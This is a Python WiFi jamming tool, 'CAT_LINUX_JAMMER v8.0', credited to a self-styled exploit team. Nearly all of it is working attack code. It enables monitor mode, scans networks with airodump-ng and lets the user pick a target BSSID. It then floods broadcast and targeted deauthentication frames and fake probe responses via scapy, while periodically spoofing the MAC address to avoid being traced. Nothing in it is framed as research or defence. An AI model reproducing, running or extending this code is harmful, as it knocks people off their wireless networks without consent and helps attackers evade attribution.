#!/usr/bin/env python3
# ─── CAT_LINUX_JAMMER v8.0 ──────────────────────────────────
# ═══════════════════════════════════════════════════════════
# 🚀 Developed By: 𝓜𝓪𝓽𝓻𝓲𝔁 𝓔𝔁𝓹𝓵𝓸𝓲𝓽𝓮𝓻
# 🔗 GitHub: https://github.com/ibsohel1991-svg
# 🔗 GitHub: https://github.com/pbbsa47-tech
# 🌐 Website: https://pbbs.unaux.com/?i=1
# 👥 Team: KCO - DARK EAGLE SQUAD
# ═══════════════════════════════════════════════════════════
# 🔥 100% Working - Kali/Parrot/Ubuntu/Arch Optimized
# 🎯 TUI Enhanced - Multi-Mode Attack - Auto MAC Spoof
# ──────────────────────────────────────────────────────────

import sys
import os
import time
import random
import threading
import subprocess
import re
import signal
import socket
import json
import platform
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11ProbeResp, Dot11Beacon
    import requests
    import psutil
except ImportError as e:
    print(f"{Fore.RED}[!] Missing module: {e}")
    print("[*] Run: sudo pip3 install scapy colorama psutil requests")
    sys.exit(1)

# ─── BRANDING ──────────────────────────────────────────────
VERSION = "v8.0"
DEV = "𝓜𝓪𝓽𝓻𝓲𝔁 𝓔𝔁𝓹𝓵𝓸𝓲𝓽𝓮𝓻"
GITHUB1 = "https://github.com/ibsohel1991-svg"
GITHUB2 = "https://github.com/pbbsa47-tech"
WEBSITE = "https://pbbs.unaux.com/?i=1"
TEAM = "KCO - DARK EAGLE SQUAD"

# ─── COLORS ─────────────────────────────────────────────
C = Fore.CYAN
G = Fore.GREEN
Y = Fore.YELLOW
R = Fore.RED
M = Fore.MAGENTA
B = Fore.BLUE
W = Fore.WHITE
RESET = Style.RESET_ALL
BRIGHT = Style.BRIGHT

# ─── GLOBAL ──────────────────────────────────────────────
running = True
packet_count = 0
selected_network = None
selected_bssid = None
selected_channel = None
interface = None
all_networks = []
attack_mode = "deauth"
mac_spoof_enabled = True
original_mac = None

# ─── DETECT DISTRO ────────────────────────────────────────
def detect_distro():
    """Detect Linux distribution"""
    try:
        with open('/etc/os-release', 'r') as f:
            content = f.read()
            if 'kali' in content.lower():
                return 'Kali Linux'
            elif 'parrot' in content.lower():
                return 'Parrot OS'
            elif 'ubuntu' in content.lower():
                return 'Ubuntu'
            elif 'arch' in content.lower():
                return 'Arch Linux'
            elif 'debian' in content.lower():
                return 'Debian'
            else:
                return 'Linux'
    except:
        return 'Linux'

DISTRO = detect_distro()

# ─── ASCII ART ───────────────────────────────────────────
def banner():
    """Display main banner"""
    os.system('clear')
    
    art = f"""
{C}{BRIGHT}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  {M}██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗                         ║
║  {M}██║     ██║████╗  ██║██║   ██║╚██╗██╔╝                         ║
║  {M}██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝                          ║
║  {M}██║     ██║██║╚██╗██║██║   ██║ ██╔██╗                          ║
║  {M}███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗                         ║
║  {M}╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝                         ║
║                                                                  ║
║  {C}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ║
║  {C}▓  {W}WiFi KILLER PRO {M}● {W}Linux Optimized {M}● {W}100% Working  {C}▓  ║
║  {C}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ║
║                                                                  ║
║  {G}🔥 Developed By: {W}{DEV}                                    ║
║  {G}📦 Version: {W}{VERSION}                                     ║
║  {G}👥 Team: {W}{TEAM}                                           ║
║  {G}🐧 Distro: {W}{DISTRO}                                       ║
║                                                                  ║
║  {Y}📌 GitHub 1: {W}{GITHUB1}                                    ║
║  {Y}📌 GitHub 2: {W}{GITHUB2}                                    ║
║  {Y}🌐 Website: {W}{WEBSITE}                                     ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
{RESET}"""
    print(art)

# ─── MATRIX RAIN EFFECT ──────────────────────────────────
def matrix_rain():
    """Cool matrix rain effect"""
    chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%&*"
    for _ in range(4):
        line = ""
        for _ in range(60):
            line += random.choice(chars) + " "
        print(f"{G}{line}{RESET}")
        time.sleep(0.03)

# ─── CHECK ROOT ──────────────────────────────────────────
def check_root():
    if os.geteuid() != 0:
        print(f"{R}[!] ❌ Must run as root!")
        print(f"{Y}[*] Run: sudo python3 cat_linux_jammer.py")
        return False
    return True

# ─── SAVE ORIGINAL MAC ──────────────────────────────────
def save_original_mac(iface):
    global original_mac
    try:
        result = subprocess.run(['macchanger', '-s', iface], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'Current MAC' in line or 'Permanent MAC' in line:
                match = re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
                if match:
                    original_mac = match.group(0)
                    print(f"{G}[+] ✅ Original MAC: {original_mac}")
                    return
    except:
        pass

# ─── MAC SPOOFER ────────────────────────────────────────
def spoof_mac(iface):
    """Change MAC address"""
    if not mac_spoof_enabled:
        return
    
    print(f"{C}[+] 🔄 Spoofing MAC address...")
    try:
        # Generate random MAC
        new_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        
        # Bring interface down
        subprocess.run(['ifconfig', iface, 'down'], capture_output=True)
        
        # Change MAC
        subprocess.run(['macchanger', '-m', new_mac, iface], capture_output=True)
        
        # Bring interface up
        subprocess.run(['ifconfig', iface, 'up'], capture_output=True)
        
        print(f"{G}[+] ✅ New MAC: {new_mac}")
    except Exception as e:
        print(f"{Y}[!] ⚠️ MAC spoof failed: {e}")

# ─── FIND INTERFACE ─────────────────────────────────────
def find_interface():
    global interface
    print(f"{C}[+] 🔍 Scanning for wireless interfaces...")
    
    # Common interface names
    interfaces = ['wlan0', 'wlan1', 'wlp2s0', 'wlp3s0', 'wlp0s20f3', 'wlx00c0ca123456']
    
    for iface in interfaces:
        try:
            result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
            if 'IEEE 802.11' in result.stdout:
                interface = iface
                print(f"{G}[+] ✅ Found: {interface}")
                save_original_mac(iface)
                return interface
        except:
            pass
    
    # Try with iw dev
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'Interface' in line:
                interface = line.split()[1]
                print(f"{G}[+] ✅ Found: {interface}")
                save_original_mac(interface)
                return interface
    except:
        pass
    
    print(f"{R}[!] ❌ No wireless interface found!")
    return None

# ─── ENABLE MONITOR MODE ──────────────────────────────
def enable_monitor_mode(iface):
    print(f"{C}[+] 📡 Enabling monitor mode...")
    
    try:
        # Kill conflicting processes
        subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
        
        # Start monitor mode
        result = subprocess.run(['airmon-ng', 'start', iface], capture_output=True, text=True)
        
        # Find the monitor interface
        monitor_iface = None
        for line in result.stdout.split('\n'):
            if 'mon' in line and iface in line:
                match = re.search(r'(\w+mon)', line)
                if match:
                    monitor_iface = match.group(1)
                    break
        
        if not monitor_iface:
            # Try common naming
            if f"{iface}mon" in result.stdout:
                monitor_iface = f"{iface}mon"
            else:
                # Check all interfaces
                result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Monitor' in line:
                        monitor_iface = line.split()[0]
                        break
        
        if monitor_iface:
            print(f"{G}[+] ✅ Monitor mode: {monitor_iface}")
            return monitor_iface
        else:
            print(f"{Y}[!] ⚠️ Monitor mode may not be active")
            return iface
            
    except Exception as e:
        print(f"{Y}[!] ⚠️ Monitor mode error: {e}")
        print(f"{Y}[*] Trying manual method...")
        
        try:
            subprocess.run(['ifconfig', iface, 'down'], capture_output=True)
            subprocess.run(['iwconfig', iface, 'mode', 'monitor'], capture_output=True)
            subprocess.run(['ifconfig', iface, 'up'], capture_output=True)
            return iface
        except:
            return iface

# ─── SCAN NETWORKS ──────────────────────────────────────
def scan_networks():
    global all_networks
    networks = []
    
    print(f"{C}[+] 🔎 Scanning for WiFi networks...")
    print(f"{Y}[*] This may take 15-20 seconds...")
    
    # Loading animation
    def loading():
        for _ in range(12):
            for c in "▰▱":
                print(f"\r{Y}[*] Scanning {c} {RESET}", end="")
                time.sleep(0.15)
    
    loading_thread = threading.Thread(target=loading, daemon=True)
    loading_thread.start()
    
    # Use airodump-ng
    try:
        cmd = ['timeout', '15', 'airodump-ng', interface]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        lines = result.stdout.split('\n')
        
        for line in lines:
            parts = line.split()
            if len(parts) >= 8:
                if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', parts[0]):
                    bssid = parts[0]
                    channel = parts[3] if len(parts) > 3 else "?"
                    signal = parts[8] if len(parts) > 8 else "?"
                    encryption = parts[5] if len(parts) > 5 else "?"
                    
                    ssid = " "
                    for i, part in enumerate(parts):
                        if i > 9 and part:
                            ssid = ' '.join(parts[i:])
                            break
                    
                    if ssid and bssid:
                        networks.append({
                            'ssid': ssid.strip() if ssid.strip() else "Hidden",
                            'bssid': bssid,
                            'channel': channel,
                            'signal': signal,
                            'encryption': encryption,
                        })
    except Exception as e:
        print(f"\r{Y}[!] ⚠️ Scan error: {e}")
    
    # Remove duplicates
    unique = []
    seen = set()
    for net in networks:
        if net['bssid'] not in seen:
            seen.add(net['bssid'])
            unique.append(net)
    
    all_networks = unique
    print(f"\r{G}[+] ✅ Found {len(unique)} networks    ")
    return unique

# ─── DISPLAY NETWORKS ──────────────────────────────────
def display_networks(networks):
    if not networks:
        print(f"{R}[!] ❌ No networks found!")
        return False
    
    print(f"\n{G}{'═'*90}")
    print(f"{C}{BRIGHT}  #  {W}SSID{G:>40} {W}BSSID{G:>22} {W}CH{G:>4} {W}SIG{G:>5} {W}ENC{G:>12}")
    print(f"{G}{'═'*90}")
    
    for i, net in enumerate(networks, 1):
        ssid = net['ssid'][:35] if net['ssid'] else "Hidden"
        bssid = net['bssid'] if net['bssid'] else "Unknown"
        channel = net['channel'] if net['channel'] else "?"
        signal = net['signal'] if net['signal'] else "?"
        encryption = net.get('encryption', '?')[:10]
        
        # Color by encryption
        if 'WPA2' in encryption:
            enc_color = G
        elif 'WPA' in encryption:
            enc_color = Y
        elif 'WEP' in encryption:
            enc_color = R
        else:
            enc_color = C
        
        # Color by signal strength
        try:
            sig_int = int(signal) if str(signal).replace('-','').isdigit() else 0
            if sig_int > 70:
                sig_color = G
            elif sig_int > 40:
                sig_color = Y
            else:
                sig_color = R
        except:
            sig_color = W
        
        print(f"  {i:2}. {W}{ssid:<35} {Y}{bssid:<17} {C}{channel:>4} {sig_color}{signal:>5}  {enc_color}{encryption:<10}")
    
    print(f"{G}{'═'*90}{RESET}")
    return True

# ─── MANUAL ENTRY ──────────────────────────────────────
def manual_entry():
    print(f"\n{C}[+] 📝 Manual Network Entry")
    print(f"{Y}[!] Use this for hidden networks")
    
    ssid = input(f"{C}[?] Enter SSID (or Enter for 'Hidden'): {W}").strip()
    if not ssid:
        ssid = "Hidden"
    
    bssid = input(f"{C}[?] Enter BSSID (AA:BB:CC:DD:EE:FF): {W}").strip()
    if not bssid or not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid.upper()):
        print(f"{R}[!] ❌ Invalid BSSID")
        return None
    
    channel = input(f"{C}[?] Enter channel (1-11, Enter for 6): {W}").strip()
    if not channel:
        channel = "6"
    
    return {
        'ssid': ssid,
        'bssid': bssid.upper(),
        'channel': channel,
        'signal': "100",
        'encryption': "Manual"
    }

# ─── SELECT NETWORK ────────────────────────────────────
def select_network(networks):
    while True:
        print(f"\n{C}{'─'*55}")
        print(f"{C}[?] {W}Options:")
        print(f"  {G}1-{len(networks)} {C}= Select network")
        print(f"  {M}m {C}= Manual entry (hidden networks)")
        print(f"  {R}0 {C}= Exit")
        print(f"{C}{'─'*55}")
        
        choice = input(f"\n{C}┌─[{Y}Choice{C}]: {W}").strip().lower()
        
        if choice == '0':
            return None
        elif choice == 'm':
            return manual_entry()
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(networks):
                    return networks[idx]
                else:
                    print(f"{R}[!] ❌ Invalid selection")
            except ValueError:
                print(f"{R}[!] ❌ Enter a valid number or 'm'")

# ─── ATTACK ENGINE ─────────────────────────────────────
def deauth_attack():
    global packet_count, running, selected_network, selected_bssid
    
    if not selected_bssid:
        print(f"{R}[!] ❌ No BSSID selected")
        return
    
    # Attack banner
    print(f"\n{G}{'═'*90}")
    print(f"{R}{BRIGHT}  ⚡⚡⚡ STARTING DEAUTH ATTACK ⚡⚡⚡")
    print(f"{G}{'═'*90}")
    print(f"{G}[+] {W}Target: {C}{selected_network['ssid']}")
    print(f"{G}[+] {W}BSSID: {C}{selected_bssid}")
    print(f"{G}[+] {W}Channel: {C}{selected_channel}")
    print(f"{G}[+] {W}Interface: {C}{interface}")
    print(f"{G}[+] {W}Attack Mode: {C}{attack_mode.upper()}")
    print(f"{G}[+] {W}MAC Spoof: {C}{'Enabled' if mac_spoof_enabled else 'Disabled'}")
    print(f"{G}{'═'*90}")
    print(f"{R}{BRIGHT}[!] PRESS CTRL+C TO STOP ATTACK{RESET}\n")
    
    # Set channel
    try:
        subprocess.run(['iwconfig', interface, 'channel', str(selected_channel)], capture_output=True)
    except:
        pass
    
    # Attack loop
    start_time = time.time()
    
    while running:
        try:
            # Broadcast deauth
            if attack_mode == "deauth" or attack_mode == "both":
                packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", 
                                            addr2=selected_bssid, 
                                            addr3=selected_bssid) / Dot11Deauth(reason=7)
                for _ in range(random.randint(30, 100)):
                    sendp(packet, iface=interface, count=1, inter=0.001, verbose=0)
                    packet_count += 1
            
            # Beacon flood
            if attack_mode == "beacon" or attack_mode == "both":
                for _ in range(random.randint(10, 30)):
                    fake_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(6))
                    packet = RadioTap() / Dot11(addr1=fake_mac, addr2=selected_bssid, addr3=selected_bssid) / Dot11ProbeResp()
                    sendp(packet, iface=interface, count=1, inter=0.001, verbose=0)
                    packet_count += 1
            
            # Targeted deauth
            for _ in range(random.randint(10, 20)):
                fake_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(6))
                packet = RadioTap() / Dot11(addr1=fake_mac, 
                                            addr2=selected_bssid, 
                                            addr3=selected_bssid) / Dot11Deauth(reason=7)
                sendp(packet, iface=interface, count=random.randint(3, 8), inter=0.001, verbose=0)
                packet_count += random.randint(3, 8)
            
            # Status bar
            elapsed = time.time() - start_time
            rate = packet_count / elapsed if elapsed > 0 else 0
            print(f"\r{G}[+] {W}Packets: {C}{packet_count:>8} {W}| {Y}Rate: {C}{rate:>6.0f}/s {W}| {M}Duration: {C}{elapsed:>5.0f}s {W}| {R}CTRL+C to stop", end="", flush=True)
            
            # Spoof MAC periodically
            if mac_spoof_enabled and packet_count % 5000 == 0:
                spoof_mac(interface)
            
            time.sleep(0.02)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            if "No route" not in str(e) and "Network is down" not in str(e):
                print(f"\n{R}[!] ⚠️ Error: {e}")
            time.sleep(0.5)

# ─── CLEANUP ────────────────────────────────────────────
def cleanup():
    """Restore original MAC and stop monitor mode"""
    try:
        if interface:
            # Stop monitor mode
            subprocess.run(['airmon-ng', 'stop', interface], capture_output=True)
            
            # Restore MAC if we saved it
            if original_mac:
                print(f"{C}[+] 🔄 Restoring original MAC...")
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True)
                subprocess.run(['macchanger', '-m', original_mac, interface], capture_output=True)
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True)
                print(f"{G}[+] ✅ MAC restored: {original_mac}")
    except:
        pass

# ─── MAIN MENU ──────────────────────────────────────────
def main_menu():
    global running, selected_network, selected_bssid, selected_channel, interface, attack_mode, mac_spoof_enabled
    
    banner()
    matrix_rain()
    
    print(f"\n{G}[+] ✅ Distro: {DISTRO}")
    print(f"{G}[+] ✅ Root: {'YES' if os.geteuid() == 0 else 'NO'}")
    
    if not check_root():
        return
    
    # Find interface
    interface = find_interface()
    if not interface:
        return
    
    # Enable monitor mode
    interface = enable_monitor_mode(interface)
    
    # MAC spoof toggle
    mac_choice = input(f"\n{C}[?] Enable MAC spoofing? (y/n, default y): {W}").lower()
    mac_spoof_enabled = mac_choice != 'n'
    
    if mac_spoof_enabled:
        spoof_mac(interface)
    
    # Select attack mode
    print(f"\n{C}{'─'*55}")
    print(f"{C}[?] {W}Select Attack Mode:")
    print(f"  {G}1 {C}= Deauth Attack (Disconnect clients)")
    print(f"  {Y}2 {C}= Beacon Flood (Overwhelm network)")
    print(f"  {R}3 {C}= Combined (Maximum destruction)")
    print(f"{C}{'─'*55}")
    
    mode_choice = input(f"\n{C}┌─[{Y}Mode{C}]: {W}").strip()
    if mode_choice == "1":
        attack_mode = "deauth"
    elif mode_choice == "2":
        attack_mode = "beacon"
    elif mode_choice == "3":
        attack_mode = "both"
    else:
        attack_mode = "deauth"
    
    print(f"{G}[+] ✅ Mode: {attack_mode.upper()}")
    
    # Scan
    networks = scan_networks()
    
    if not networks:
        print(f"{Y}[!] No networks found automatically.")
        choice = input(f"{C}[?] Enter BSSID manually? (y/n): {W}").lower()
        if choice == 'y':
            net = manual_entry()
            if net:
                networks = [net]
        else:
            return
    
    # Display
    display_networks(networks)
    
    # Select
    selected = select_network(networks)
    if not selected:
        print(f"{R}[!] Exiting...")
        return
    
    selected_network = selected
    selected_bssid = selected['bssid']
    selected_channel = selected['channel']
    
    # Confirm
    print(f"\n{G}[+] 🎯 Target: {C}{selected['ssid']}")
    print(f"{G}[+] 📡 BSSID: {C}{selected_bssid}")
    print(f"{G}[+] 📶 Channel: {C}{selected_channel}")
    
    confirm = input(f"\n{R}{BRIGHT}[?] START ATTACK? (y/n): {W}").lower()
    if confirm != 'y':
        print(f"{R}[!] Cancelled")
        cleanup()
        return
    
    # Start attack
    try:
        deauth_attack()
    except KeyboardInterrupt:
        pass
    
    # Stats
    print(f"\n\n{G}{'═'*90}")
    print(f"{C}{BRIGHT}  📊 ATTACK STATISTICS")
    print(f"{G}{'═'*90}")
    print(f"{G}[+] {W}Total Packets: {C}{packet_count}")
    print(f"{G}[+] {W}Target: {C}{selected_network['ssid']}")
    print(f"{G}[+] {W}BSSID: {C}{selected_bssid}")
    print(f"{G}[+] {W}Attack Mode: {C}{attack_mode.upper()}")
    print(f"{G}{'═'*90}")
    
    # Cleanup
    cleanup()
    
    input(f"\n{Y}Press Enter to exit...")

# ─── SIGNAL HANDLER ────────────────────────────────────
def signal_handler(sig, frame):
    global running
    print(f"\n{R}[!] ⛔ Stopping attack...")
    running = False
    time.sleep(0.5)
    cleanup()
    sys.exit(0)

# ─── RUN ──────────────────────────────────────────────
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Exiting...")
        cleanup()
    except Exception as e:
        print(f"{R}[!] Error: {e}")
        cleanup()
        input("Press Enter to exit...")